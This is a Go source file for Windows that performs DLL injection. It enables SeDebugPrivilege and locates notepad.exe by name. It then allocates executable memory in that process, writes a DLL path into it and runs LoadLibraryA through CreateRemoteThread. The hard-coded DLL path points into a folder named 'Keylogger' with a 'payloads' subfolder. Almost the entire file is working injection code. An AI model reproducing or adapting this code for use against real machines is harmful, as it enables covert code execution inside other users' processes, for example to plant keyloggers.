package main

import (
	"fmt"
	"log"
	"unsafe"

	"golang.org/x/sys/windows"
)

func setSeDebugPrivilege() {
	// Get current process (the one I wanna change)
	handle, err := windows.GetCurrentProcess()
	defer windows.CloseHandle(handle)
	if err != nil {
		log.Fatal(err)
	}

	// Get the current process token
	var token windows.Token
	err = windows.OpenProcessToken(handle, windows.TOKEN_ADJUST_PRIVILEGES, &token)
	if err != nil {
		log.Fatal(err)
	}

	// Check the LUID
	var luid windows.LUID
	seDebugName, err := windows.UTF16FromString("SeDebugPrivilege")
	if err != nil {
		fmt.Println(err)
	}
	err = windows.LookupPrivilegeValue(nil, &seDebugName[0], &luid)
	if err != nil {
		log.Fatal(err)
	}

	// Modify the token
	var tokenPriviledges windows.Tokenprivileges
	tokenPriviledges.PrivilegeCount = 1
	tokenPriviledges.Privileges[0].Luid = luid
	tokenPriviledges.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED

	// Adjust token privs
	err = windows.AdjustTokenPrivileges(token, false, &tokenPriviledges, uint32(unsafe.Sizeof(tokenPriviledges)), nil, nil)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("[+] Debug Priviledge granted")
}

func main() {
	var (
		target    = "notepad.exe"
		targetDLL = "C:\\Users\\gcaso\\Keylogger\\bin\\payloads\\calc_dll\\calcdll.dll"
		targetID  uint32
	)

	// Grant the process SeDebugPrivilege
	setSeDebugPrivilege()

	// Check to find the process id (PID) we are interested in
	processesSnap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	defer windows.CloseHandle(processesSnap)
	if err != nil {
		log.Fatal(err)
	}
	var pe32 windows.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))
	err = windows.Process32First(processesSnap, &pe32)
	if err != nil {
		log.Fatal(err)
	}
	for {
		if pe32.ProcessID > 0 {
			processName := windows.UTF16PtrToString(&pe32.ExeFile[0])
			if processName == target {
				targetID = pe32.ProcessID
			}
		}
		err = windows.Process32Next(processesSnap, &pe32)
		if err != nil {
			break
		}
	}

	fmt.Printf("[+] Found target PID: %d\n", targetID)

	// Now that we have the PID of the process we want to target, we can get a handle to it
	victimProcess, err := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|
		windows.PROCESS_QUERY_INFORMATION|
		windows.PROCESS_VM_OPERATION|
		windows.PROCESS_VM_WRITE|
		windows.PROCESS_VM_READ, false, targetID)
	defer windows.CloseHandle(victimProcess)
	if err != nil {
		log.Fatal(err)
	}

	// Trying to allocate memory on remote process. VirtualAllocEx is not defined on the windows package
	var (
		kernel32DLL        = windows.NewLazyDLL("kernel32.dll")
		virtualAllocEx     = kernel32DLL.NewProc("VirtualAllocEx")
		writeProcessMemory = kernel32DLL.NewProc("WriteProcessMemory")
	)
	dwSize := uint32(len(targetDLL))
	addr, _, err := virtualAllocEx.Call(
		uintptr(victimProcess),
		uintptr(unsafe.Pointer(nil)),
		uintptr(dwSize),
		uintptr(windows.MEM_RESERVE|windows.MEM_COMMIT),
		uintptr(windows.PAGE_EXECUTE_READWRITE))
	if addr == 0 {
		fmt.Println("[-] virtualAllocEx returned NULL")
		log.Fatal(err)
	}

	// Trying to write the DLL path to the allocated memory
	buffer := []byte(targetDLL)
	var writtenBytes uint64 = 0
	r1, _, err := writeProcessMemory.Call(
		uintptr(victimProcess),
		uintptr(addr),
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(dwSize),
		uintptr(unsafe.Pointer(&writtenBytes)),
	)
	if r1 == 0 {
		fmt.Println("[-] writeProcessMemory failed")
		//log.Fatal(err)
	}
	fmt.Printf("[+] Written %d bytes to remote process\n", writtenBytes)

	// Get LoadLibrary memory address
	moduleName, err := windows.UTF16FromString("kernel32.dll")
	if err != nil {
		log.Fatal(err)
	}
	var kernel32Module windows.Handle
	err = windows.GetModuleHandleEx(0, &moduleName[0], &kernel32Module)
	if err != nil {
		log.Fatal(err)
	}
	loadLibrary, err := windows.GetProcAddress(kernel32Module, "LoadLibraryA")
	if err != nil {
		log.Fatal(err)
	}

	// Create remote thread and launch out payload DLLs. CreateRemoteThread is not defined by the windows package
	createRemoteThread := kernel32DLL.NewProc("CreateRemoteThread")
	r1, _, err = createRemoteThread.Call(
		uintptr(victimProcess),
		uintptr(unsafe.Pointer(nil)),
		0,
		loadLibrary,
		addr,
		0,
		uintptr(unsafe.Pointer(nil)))
	if r1 == 0 {
		fmt.Println("[-] Failed to launch remote thread")
		log.Fatal(err)
	}
	handle := windows.Handle(r1)
	windows.WaitForSingleObject(handle, windows.INFINITE)
}
